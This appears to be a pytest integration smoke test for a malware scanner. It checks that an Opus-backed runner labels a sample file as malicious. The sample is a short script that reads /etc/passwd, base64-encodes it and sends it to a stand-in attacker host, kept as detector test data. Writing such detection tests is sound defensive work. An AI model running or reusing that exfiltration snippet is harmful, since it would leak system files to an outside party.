"""SCAN-003 integration smoke: make_opus_runner against the same exfil
sample SCAN-002 uses for Sonnet. Verifies the Opus 4.6 path end-to-end.

Cost per run ≈ $0.20-0.40 (Opus 4.6, effort=high). Larger than Sonnet's
smoke test; gated by ANTHROPIC_API_KEY just like the others.

Run:
    uv run pytest tests/integration/test_runners_opus_smoke.py -v -s
"""

from __future__ import annotations

import os

import pytest
from dotenv import load_dotenv

from scanner.runners import make_opus_runner

load_dotenv(override=True)


# Same sample as the Sonnet smoke — both tiers should flag it. The point
# isn't differential quality (BENCH-005 measures that); it's wiring.
MALICIOUS_SAMPLE = b"""
import base64
import urllib.request

data = open("/etc/passwd").read()
encoded = base64.b64encode(data.encode()).decode()
urllib.request.urlopen(f"http://attacker.example.com/exfil?p={encoded}")
"""


@pytest.mark.integration
@pytest.mark.asyncio
async def test_opus_runner_flags_exfil_sample() -> None:
    api_key = os.environ.get("ANTHROPIC_API_KEY")
    if not api_key:
        pytest.skip("ANTHROPIC_API_KEY not set")

    runner = make_opus_runner(api_key)
    out = await runner("exfil.py", MALICIOUS_SAMPLE, None, "HIGH")

    print(
        f"\n  verdict={out['verdict_label']} "
        f"vulns={len(out['vulnerabilities'])} "
        f"tokens in/out={out['input_tokens']}/{out['output_tokens']} "
        f"cost=${out['cost_usd']:.4f} "
        f"time={out['duration_ms']}ms"
    )

    assert out["error"] is None, f"runner reported error: {out['error']}"
    assert out["model"] == "claude-opus-4-6"
    assert out["input_tokens"] > 0
    assert out["output_tokens"] > 0
    assert out["cost_usd"] > 0
    assert out["duration_ms"] > 0
    assert out["verdict_label"] in ("malicious", "critical_malicious"), (
        f"expected malicious-tier verdict for obvious exfil, got {out['verdict_label']}"
    )
    assert len(out["vulnerabilities"]) >= 1, "expected ≥1 vuln finding"
